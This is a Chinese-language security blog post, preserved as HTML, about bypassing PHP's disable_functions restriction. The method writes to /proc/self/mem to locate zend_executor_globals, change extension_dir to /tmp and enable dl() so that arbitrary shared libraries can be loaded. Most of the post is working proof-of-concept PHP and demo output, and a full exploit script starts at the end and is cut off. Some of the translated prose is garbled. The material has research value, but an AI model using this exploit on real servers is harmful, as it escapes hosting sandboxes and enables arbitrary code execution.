@@ -1,0 +1,617 @@
+
+ <!DOCTYPE HTML>
+<html >
+<head>
+  <meta charset="UTF-8">
+  
+    <title>利用zend_executor_globals 绕过disable_functions | Hear7v&#39;s Blog</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
+    
+    <meta name="author" content="Hear7v">
+    
+
+    
+    <meta name="description" content="Overview一篇发布在https://rdot.org 上的文章，展示了作者通过fopen(),fread(),fwrite()函数来操纵内存文件/proc/self/mem。通函过这样的手段，我们就可以用system()函数的地址来替换GOT中open()函数的地址，这样，攻击者就可以通执行任意os命令过readfile().以下是漏洞产生的条件:
+
+PHP 必须运行于PHP-CGI/PHP">
+<meta property="og:type" content="article">
+<meta property="og:title" content="利用zend_executor_globals 绕过disable_functions">
+<meta property="og:url" content="http://yoursite.com/2015/10/31/利用zend-executor-globals-绕过disable-functions/index.html">
+<meta property="og:site_name" content="Hear7v's Blog">
+<meta property="og:description" content="Overview一篇发布在https://rdot.org 上的文章，展示了作者通过fopen(),fread(),fwrite()函数来操纵内存文件/proc/self/mem。通函过这样的手段，我们就可以用system()函数的地址来替换GOT中open()函数的地址，这样，攻击者就可以通执行任意os命令过readfile().以下是漏洞产生的条件:
+
+PHP 必须运行于PHP-CGI/PHP">
+<meta property="og:updated_time" content="2016-01-11T03:07:19.191Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="利用zend_executor_globals 绕过disable_functions">
+<meta name="twitter:description" content="Overview一篇发布在https://rdot.org 上的文章，展示了作者通过fopen(),fread(),fwrite()函数来操纵内存文件/proc/self/mem。通函过这样的手段，我们就可以用system()函数的地址来替换GOT中open()函数的地址，这样，攻击者就可以通执行任意os命令过readfile().以下是漏洞产生的条件:
+
+PHP 必须运行于PHP-CGI/PHP">
+
+    
+    <link rel="alternative" href="/atom.xml" title="Hear7v&#39;s Blog" type="application/atom+xml">
+    
+    
+    <link rel="icon" href="/img/favicon.ico">
+    
+    
+    <link rel="apple-touch-icon" href="/img/jacman.jpg">
+    <link rel="apple-touch-icon-precomposed" href="/img/jacman.jpg">
+    
+    <link rel="stylesheet" href="/css/style.css" type="text/css">
+</head>
+
+  <body>
+    <header>
+      
+<div>
+		
+			<div id="imglogo">
+				<a href="/"><img src="/img/logo.png" alt="Hear7v&#39;s Blog" title="Hear7v&#39;s Blog"/></a>
+			</div>
+			
+			<div id="textlogo">
+				<h1 class="site-name"><a href="/" title="Hear7v&#39;s Blog">Hear7v&#39;s Blog</a></h1>
+				<h2 class="blog-motto"></h2>
+			</div>
+			<div class="navbar"><a class="navbutton navmobile" href="#" title="菜單">
+			</a></div>
+			<nav class="animated">
+				<ul>
+					<ul>
+					 
+						<li><a href="/">Home</a></li>
+					
+						<li><a href="/archives">Archives</a></li>
+					
+						<li><a href="/category">Category</a></li>
+					
+						<li><a href="/about">About</a></li>
+					
+					<li>
+ 					
+					<form class="search" action="//google.com/search" method="get" accept-charset="utf-8">
+						<label>Search</label>
+						<input type="search" id="search" name="q" autocomplete="off" maxlength="20" placeholder="搜索" />
+						<input type="hidden" name="q" value="site:yoursite.com">
+					</form>
+					
+					</li>
+				</ul>
+			</nav>			
+</div>
+    </header>
+    <div id="container">
+      <div id="main" class="post" itemscope itemprop="blogPost">
+  
+	<article itemprop="articleBody"> 
+		<header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/2015/10/31/利用zend-executor-globals-绕过disable-functions/" title="利用zend_executor_globals 绕过disable_functions" itemprop="url">利用zend_executor_globals 绕过disable_functions</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="/about" title="Hear7v" target="_blank" itemprop="author">Hear7v</a>
+		
+  <p class="article-time">
+    <time datetime="2015-10-30T16:00:50.000Z" itemprop="datePublished"> 發表於 2015-10-31</time>
+    
+  </p>
+</header>
+	<div class="article-content">
+		
+		<div id="toc" class="toc-article">
+			<strong class="toc-title">文章目錄</strong>
+		
+			<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Overview"><span class="toc-number">1.</span> <span class="toc-text">Overview</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Test_environment"><span class="toc-number">2.</span> <span class="toc-text">Test environment</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Why_is_sl()?"><span class="toc-number">3.</span> <span class="toc-text">Why is sl()?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Research_structures"><span class="toc-number">4.</span> <span class="toc-text">Research structures</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05_Search_for_options"><span class="toc-number">5.</span> <span class="toc-text">0x05 Search for options</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06_final"><span class="toc-number">6.</span> <span class="toc-text">0x06 final</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#code"><span class="toc-number">7.</span> <span class="toc-text">code</span></a></li></ol>
+		
+		</div>
+		
+		<h2 id="Overview">Overview</h2><p>一篇发布在<a href="https://rdot.org" target="_blank" rel="external">https://rdot.org</a> 上的文章，展示了作者通过<code>fopen()</code>,<code>fread()</code>,<code>fwrite()</code>函数来操纵内存文件<code>/proc/self/mem</code>。通函过这样的手段，我们就可以用<code>system()</code>函数的地址来替换GOT中<code>open()</code>函数的地址，这样，攻击者就可以通执行任意os命令过<code>readfile()</code>.<br>以下是漏洞产生的条件:</p>
+<ul>
+<li>PHP 必须运行于PHP-CGI/PHP-FPM/CLI模式下。</li>
+<li>POC只能运行于X86平台。</li>
+<li>内核版本必须大于2.98。 </li>
+<li>open_basedir = off。</li>
+</ul>
+<p>不过也会带来一些问题：</p>
+<ul>
+<li>由于GOT被修改，php worker将会奔溃</li>
+<li>造成系统不稳定</li>
+</ul>
+<p>这次，我们首先修改全局配置打开’god mode’—–允许dl(),并设置<code>extension_dir</code>为<code>/tmp</code>.</p>
+<h2 id="Test_environment">Test environment</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ylbhz@ylbhz-Aspire-<span class="number">5750</span>G:/tmp$ php -v</span><br><span class="line">PHP <span class="number">5.5</span>.<span class="number">9</span>-<span class="number">1</span>ubuntu4.<span class="number">9</span> (cli) (built: Apr <span class="number">17</span> <span class="number">2015</span> <span class="number">11</span>:<span class="number">44</span>:<span class="number">57</span>) Copyright (c) <span class="number">1997</span>-<span class="number">2014</span> The PHP Group</span><br><span class="line">Zend Engine v2.<span class="number">5.0</span>, Copyright (c) <span class="number">1998</span>-<span class="number">2014</span> Zend Technologies</span><br><span class="line">with Zend OPcache v7.<span class="number">0.3</span>, Copyright (c) <span class="number">1999</span>-<span class="number">2014</span>, by Zend Technologies ylbhz@ylbhz-Aspire-<span class="number">5750</span>G:/tmp$ uname <span class="operator">-a</span></span><br><span class="line">Linux ylbhz-Aspire-<span class="number">5750</span>G <span class="number">3.13</span>.<span class="number">0</span>-<span class="number">48</span>-generic <span class="comment">#80-Ubuntu SMP Thu Mar 12 11:16:15 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux</span></span><br></pre></td></tr></table></figure>
+<h2 id="Why_is_sl()?">Why is sl()?</h2><p>这个php函数和dlopen()函数相似，可以很方便地用来加载我们想要的更多的代码(动态链接库)。当然，我们无法使用intset()函数吧enabledl设为true，以及把extension_dir设为其属下的目录。</p>
+<h2 id="Research_structures">Research structures</h2><p><code>struct_zend_executor_globals</code>:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span></span><br><span class="line">_zend_executor_globals</span><br><span class="line">&#123;</span><br><span class="line">	zval	**return_value_ptr_ptr;</span><br><span class="line">	zval	uninitialized_zval;</span><br><span class="line">	zval	*uninitialized_zval_ptr;</span><br><span class="line">	zval	error_zval;</span><br><span class="line">	zval	*error_zval_ptr;</span><br><span class="line">	zend_ptr_stack	arg_types_stack;</span><br><span class="line">/\*symbol table cache*\/</span><br><span class="line">HashTable	*symtable_cache[SYMTABLE_CACHE_SIZE];</span><br><span class="line">HashTable	**symtable_cache_limit;</span><br><span class="line">HashTable	**symtable_cache_ptr;</span><br><span class="line">zend_op		**opline_ptr;</span><br><span class="line">HashTable	*active_symbol_table;</span><br><span class="line">HashTable	symbol_table;</span><br><span class="line">/\*main	symbol	table*\/</span><br><span class="line">HashTable	included_files;</span><br><span class="line">/\*file sal ready included*\/</span><br><span class="line">JMP_BUF	*bailout;</span><br><span class="line"><span class="keyword">int</span>	error_reporting;<span class="comment">//value	of	error_reporting</span></span><br><span class="line"><span class="keyword">int</span>	orig_error_reporting;</span><br><span class="line"><span class="keyword">int</span>	exit_status;</span><br><span class="line">zend_op_array	*active_op_array;</span><br><span class="line">HashTable	*function_table;</span><br><span class="line">/\*function	symbol	table*\/</span><br><span class="line">HashTable	*class_table;</span><br><span class="line">/\*<span class="keyword">class</span>	table*\/</span><br><span class="line">HashTable	*zend_constants;</span><br><span class="line">/\*constants	table*\/</span><br><span class="line">zend_class_entry	*scope;</span><br></pre></td></tr></table></figure></p>
+<p>……..</p>
+<h2 id="0x05_Search_for_options">0x05 Search for options</h2><p>首先，我们决定到哪里去搜索<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ylbhz@ylbhz-Aspire-<span class="number">5750</span>G:/tmp$ php -r <span class="string">"echo file_get_contents('/proc/self/maps');"</span></span><br><span class="line"><span class="number">00400000</span>-<span class="number">00</span>bf3000 r-xp <span class="number">00000000</span> /usr/bin/php5</span><br><span class="line"><span class="number">00</span>df3000-<span class="number">00</span>e94000 r--p <span class="number">007</span>f3000 <span class="number">08</span>:<span class="number">01</span> <span class="number">4997702</span> <span class="number">00</span>e94000-<span class="number">00</span>ea1000 rw-p <span class="number">00894000</span> /usr/bin/php5</span><br><span class="line"><span class="number">00</span>ea1000-<span class="number">00</span>ebe000 rw-p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span></span><br><span class="line"><span class="number">0278</span>f000-<span class="number">02</span>a65000 rw-p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span> ...etc...</span><br></pre></td></tr></table></figure></p>
+<p>当然，你可以使用php来搜索内存映射镜像。<br>现在我们利用set_time_limit和error_reporting在内存中建立一个标志<br><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(<span class="number">0x66778899</span>)<span class="comment">; </span></span><br><span class="line">set_time_limit(<span class="number">0x41424344</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure></p>
+<p>下面，我们使用fopen()函数(rb)来打开<code>/proc/self/mem</code>,并将文件指针移动到我们搜索的内存空间的起始位置。然后，我们在内存中搜索0x66778899.<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$mem</span> = fopen(<span class="string">"/proc/self/mem"</span>, <span class="string">"rb"</span>); fseek(<span class="variable">$mem</span>, <span class="number">0x00ea1000</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>;<span class="variable">$i</span> &lt; <span class="number">0x00ebe000</span> - <span class="number">0x00ea1000</span>;<span class="variable">$i</span> += <span class="number">4</span>) &#123;</span><br><span class="line"><span class="variable">$num</span> = unp(fread(<span class="variable">$mem</span>, <span class="number">4</span>));</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$num</span> == <span class="number">0x66778899</span>) <span class="comment">//set by error_reporting()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$offset</span> = <span class="number">0x00ea1000</span> + <span class="variable">$i</span>;</span><br><span class="line">printf(<span class="string">"got noe, offset is:0x%x\r\n"</span>, <span class="variable">$offset</span>);</span><br></pre></td></tr></table></figure></p>
+<p>我们可以使用error_reporting()输出相应的信息，来验证我们的操作。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">printf(<span class="string">"Now set error_reporting to 0x55667788 and reread the value\r\n"</span>); </span><br><span class="line">error_reporting(<span class="number">0x55667788</span>);</span><br><span class="line">fseek(<span class="variable">$mem</span>, <span class="variable">$offset</span>);</span><br><span class="line"><span class="variable">$num</span> = unp(fread(<span class="variable">$mem</span>, <span class="number">4</span>));</span><br><span class="line">printf(<span class="string">"The value is %x\r\n"</span>, <span class="variable">$num</span>); </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$num</span> == <span class="number">0x55667788</span>)&#123;printf(<span class="string">"I found the offset of executor_globals's member error_reporting\r\n"</span>);</span><br></pre></td></tr></table></figure></p>
+<p>接下来，以同样的方法搜索成员timeout_seconds。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fseek(<span class="variable">$mem</span>, <span class="variable">$offset</span>);</span><br><span class="line">fseek(<span class="variable">$mem</span>, <span class="variable">$offset</span> + <span class="number">392</span> - <span class="number">8</span>); <span class="comment">//seek to int timeout_seconds member </span></span><br><span class="line"><span class="variable">$timeout</span> = dump_value(<span class="variable">$mem</span>, <span class="number">4</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$timeout</span> == <span class="number">0x41424344</span>) <span class="comment">//set by set_time_limit()&#123;</span></span><br></pre></td></tr></table></figure></p>
+<p>现在，我们已经确认了_zend_executor_globals结构的地址，那么找到ini_directives成员和Bucket **arBuckets也就很简单了。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">printf(<span class="string">"I found the timeout_seconds I seted:0x%08x\r\n"</span>, <span class="variable">$timeout</span>); dump_value(<span class="variable">$mem</span>, <span class="number">4</span>);</span><br><span class="line"><span class="variable">$ini_dir</span> = dump_value(<span class="variable">$mem</span>, <span class="number">8</span>);</span><br><span class="line">printf(<span class="string">"ini_directives address maybe in 0x%016x\r\n"</span>, <span class="variable">$ini_dir</span>); fseek(<span class="variable">$mem</span>, <span class="variable">$ini_dir</span> + <span class="number">48</span>); <span class="comment">//seek to Bucket **arBuckets; $arBucket = dump_value($mem, 8);</span></span><br><span class="line">printf(<span class="string">"Bucket **arBuckets address maybe in 0x%016x\r\n"</span>, <span class="variable">$arBucket</span>); fseek(<span class="variable">$mem</span>, <span class="variable">$arBucket</span>);</span><br></pre></td></tr></table></figure></p>
+<p>根据Bucket **arBuckets，我们就可以遍历所有选项，直到找到我们想要的那些为止。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>;<span class="variable">$i</span> &lt; <span class="number">1000</span>;<span class="variable">$i</span> ++) &#123;</span><br><span class="line"><span class="variable">$name</span>, <span class="variable">$name_t</span>);</span><br><span class="line">...etc...</span><br><span class="line"><span class="variable">$bucket</span> = dump_value(<span class="variable">$mem</span>, <span class="number">8</span>);</span><br><span class="line"><span class="comment">//printf("This bucket address maybe in 0x%016x\r\n", $bucket); fseek($mem, $bucket + 16); //seek to const void *pData; in struct Bucket $pdata = dump_value($mem, 8);</span></span><br><span class="line">dump_value(<span class="variable">$mem</span>, <span class="number">8</span>);</span><br><span class="line"><span class="comment">//printf("This pData address maybe in 0x%016x\r\n", $pdata);</span></span><br><span class="line">fseek(<span class="variable">$mem</span>, <span class="variable">$pdata</span> + <span class="number">8</span>); <span class="comment">//seek to char* name;</span></span><br><span class="line"><span class="variable">$name</span> = dump_value(<span class="variable">$mem</span>, <span class="number">8</span>);</span><br><span class="line"><span class="variable">$name_t</span> = dump_value(<span class="variable">$mem</span>, <span class="number">4</span>);</span><br><span class="line"><span class="comment">//printf("This char name* address maybe in 0x%016x, length:%d\r\n",</span></span><br><span class="line">fseek(<span class="variable">$mem</span>, <span class="variable">$name</span>);</span><br><span class="line"><span class="variable">$strname</span> = fread(<span class="variable">$mem</span>, <span class="variable">$name_t</span>); <span class="keyword">if</span>(strlen(<span class="variable">$strname</span>) == <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line"><span class="comment">//printf("ini key:%s\r\n", $strname); if(strncmp($strname, 'extension_dir', 13) == 0) &#123;</span></span><br><span class="line">fseek(<span class="variable">$mem</span>, <span class="variable">$pdata</span> + <span class="number">56</span>); <span class="comment">//seek to char* value;</span></span><br><span class="line"><span class="variable">$value</span> = dump_value(<span class="variable">$mem</span>, <span class="number">8</span>);</span><br><span class="line"><span class="variable">$value_t</span> = dump_value(<span class="variable">$mem</span>, <span class="number">4</span>);</span><br><span class="line">printf(<span class="string">"This char value* address maybe in 0x%016x,</span><br><span class="line">length:%d\r\n"</span>, <span class="variable">$value</span>, <span class="variable">$value_t</span>); </span><br><span class="line">...etc...</span><br></pre></td></tr></table></figure></p>
+<p>将extension_dir修改为/tmp<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$mem_w</span> = fopen(<span class="string">"/proc/self/mem"</span>, <span class="string">"wb"</span>); fseek(<span class="variable">$mem_w</span>, <span class="variable">$value</span>);</span><br><span class="line">fwrite(<span class="variable">$mem_w</span>, <span class="string">"/tmp\0"</span>, <span class="number">5</span>); <span class="comment">//write /tmp value printf("retry to get extension_dir value!!!!\r\n"); </span></span><br><span class="line">var_dump(ini_get(<span class="string">'extension_dir'</span>));</span><br></pre></td></tr></table></figure></p>
+<p>修改enable_dl选项的modifiable成员，如下所示：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$modifiable</span> = dump_value(<span class="variable">$mem</span>, <span class="number">4</span>);</span><br><span class="line">printf(<span class="string">"org modifiable value is %x\r\n"</span>, <span class="variable">$modifiable</span>); <span class="variable">$mem_w</span> = fopen(<span class="string">"/proc/self/mem"</span>, <span class="string">"wb"</span>); fseek(<span class="variable">$mem_w</span>, <span class="variable">$pdata</span> + <span class="number">4</span>); <span class="comment">//seek to modifiable fwrite($mem_w, packli(7));</span></span><br><span class="line"><span class="comment">/* modifiable is a bit field</span><br><span class="line">#define ZEND_INI_USER (1&lt;0) #define ZEND_INI_PERDIR (1&lt;1) #define ZEND_INI_SYSTEM (1&lt;2) */</span></span><br><span class="line">...etc......etc...</span><br><span class="line">printf(<span class="string">"try ini_set enable_dl agen!!!!\r\n"</span>);</span><br><span class="line">ini_set(<span class="string">'enable_dl'</span>, <span class="keyword">true</span>);</span><br></pre></td></tr></table></figure></p>
+<p>最后，调用dl()函数。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dl(<span class="string">'not_exists'</span>);</span><br></pre></td></tr></table></figure></p>
+<h2 id="0x06_final">0x06 final</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">ylbhz@ylbhz-Aspire-<span class="number">5750</span>G:/tmp$ php_cgimode_fpm_writeprocmemfile_bypass_disablefunction_demo.php</span><br><span class="line">got noe, offset is:<span class="number">0</span>xebd180</span><br><span class="line">Now <span class="built_in">set</span> error_reporting to <span class="number">0</span>x55667788 and reread the value</span><br><span class="line">The value is <span class="number">55667788</span></span><br><span class="line">I found the offset of executor_globals<span class="string">'s member error_reporting</span><br><span class="line">read the structure</span><br><span class="line">I found the timeout_seconds I seted:0x41424344</span><br><span class="line">ini_directives address maybe in 0x00000000024983c0</span><br><span class="line">Bucket **arBuckets address maybe in 0x00000000026171e0</span><br><span class="line">I found the extension_dir offset!</span><br><span class="line">try to set extension_dir value /tmp by ini_set</span><br><span class="line">try to get extension_dir value by ini_get</span><br><span class="line">string(22) "/usr/lib/php5/20121212"</span><br><span class="line">This char value* address maybe in 0x0000000000b5ea53, length:22</span><br><span class="line">retry to get extension_dir value!!!!</span><br><span class="line">string(4) "/tmp"</span><br><span class="line">got noe, offset is:0xebd180</span><br><span class="line">Now set error_reporting to 0x55667788 and reread the value</span><br><span class="line">The value is 55667788</span><br><span class="line">I found the offset of executor_globals'</span>s member error_reporting</span><br><span class="line"><span class="built_in">read</span> the structure</span><br><span class="line">I found the timeout_seconds I seted:<span class="number">0</span>x41424344</span><br><span class="line">ini_directives address maybe <span class="keyword">in</span> <span class="number">0</span>x00000000024983c0</span><br><span class="line">Bucket **arBuckets address maybe <span class="keyword">in</span> <span class="number">0</span>x00000000026171e0</span><br><span class="line">I found the <span class="built_in">enable</span>_dl offset!</span><br><span class="line">try to <span class="built_in">set</span> <span class="built_in">enable</span>_dl value <span class="literal">true</span> by ini_<span class="built_in">set</span></span><br><span class="line">try to get <span class="built_in">enable</span>_dl value by ini_get</span><br><span class="line">string(<span class="number">0</span>) <span class="string">""</span></span><br><span class="line">try to run dl() <span class="keyword">function</span></span><br><span class="line">PHP Warning: dl(): Dynamically /tmp/php_cgimode_fpm_writeprocmemfile_bypass_disablefunction_demo.php on line <span class="number">326</span> try to modifiy the modifiable member <span class="keyword">in</span> memory!</span><br><span class="line">org modifiable value is <span class="number">4</span></span><br><span class="line">now modifiable value is <span class="number">7</span></span><br><span class="line">try ini_<span class="built_in">set</span> <span class="built_in">enable</span>_dl agen!!!!</span><br><span class="line"></span><br><span class="line">now <span class="built_in">enable</span>_dl seting is</span><br><span class="line">string(<span class="number">1</span>) <span class="string">"1"</span></span><br><span class="line">retry the dl() <span class="keyword">function</span>!!!!</span><br><span class="line">PHP Warning: dl(): Unable to load dynamic library <span class="string">'/tmp/not_exists'</span> - /tmp/not_exists: cannot open shared object file: No such file or directory</span><br></pre></td></tr></table></figure>
+<h2 id="code">code</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">&lt;?php</span> error_reporting(<span class="number">0x66778899</span>); set_time_limit(<span class="number">0x41424344</span>); define(<span class="string">'ZEND_INI_USER'</span>, (<span class="number">1</span>&lt;&lt;<span class="number">0</span>)); define(<span class="string">'ZEND_INI_PERDIR'</span>, (<span class="number">1</span>&lt;&lt;<span class="number">1</span>)); define(<span class="string">'ZEND_INI_SYSTEM'</span>, (<span class="number">1</span>&lt;&lt;<span class="number">2</span>));</span><br><span class="line"><span class="variable">$mem</span> = fopen(<span class="string">"/proc/self/mem"</span>, <span class="string">"rb"</span>);</span><br><span class="line"><span class="comment">//set the extension_dir</span></span><br><span class="line">fseek(<span class="variable">$mem</span>, <span class="number">0x00ea1000</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>;<span class="variable">$i</span> &lt; <span class="number">0x00ebe000</span> - <span class="number">0x00ea1000</span>;<span class="variable">$i</span> += <span class="number">4</span>) &#123;</span><br><span class="line"><span class="comment">//echo 'x';</span></span><br><span class="line"><span class="variable">$num</span> = unp(fread(<span class="variable">$mem</span>, <span class="number">4</span>)); <span class="keyword">if</span>(<span class="variable">$num</span> == <span class="number">0x66778899</span>)&#123;</span><br><span class="line"><span class="variable">$offset</span> = <span class="number">0x00ea1000</span> + <span class="variable">$i</span>;</span><br><span class="line">printf(<span class="string">"got noe, offset is:0x%x\r\n"</span>, <span class="variable">$offset</span>);</span><br><span class="line">printf(<span class="string">"Now set error_reporting to 0x55667788 and reread the value\r\n"</span>); error_reporting(<span class="number">0x55667788</span>);</span><br><span class="line">fseek(<span class="variable">$mem</span>, <span class="variable">$offset</span>);</span><br><span class="line"><span class="variable">$num</span> = unp(fread(<span class="variable">$mem</span>, <span class="number">4</span>));</span><br><span class="line">printf(<span class="string">"The value is %x\r\n"</span>, <span class="variable">$num</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$num</span> == <span class="number">0x55667788</span>)</span><br><span class="line">&#123;</span><br><span class="line">printf(<span class="string">"I found the offset of executor_globals's member error_reporting\r\n"</span>);</span><br><span class="line">printf(<span class="string">"read the structure\r\n"</span>);</span><br><span class="line">fseek(<span class="variable">$mem</span>, <span class="variable">$offset</span>);</span><br><span class="line">fseek(<span class="variable">$mem</span>, <span class="variable">$offset</span> + <span class="number">392</span> - <span class="number">8</span>); <span class="comment">//seek to int timeout_seconds member $timeout = dump_value($mem, 4);</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$timeout</span> == <span class="number">0x41424344</span>)</span><br><span class="line">&#123;</span><br><span class="line">error_reporting(E_ALL); <span class="comment">//restore the error reporting</span></span><br><span class="line">printf(<span class="string">"I found the timeout_seconds I seted:0x%08x\r\n"</span>, <span class="variable">$timeout</span>); dump_value(<span class="variable">$mem</span>, <span class="number">4</span>);</span><br><span class="line"><span class="variable">$ini_dir</span> = dump_value(<span 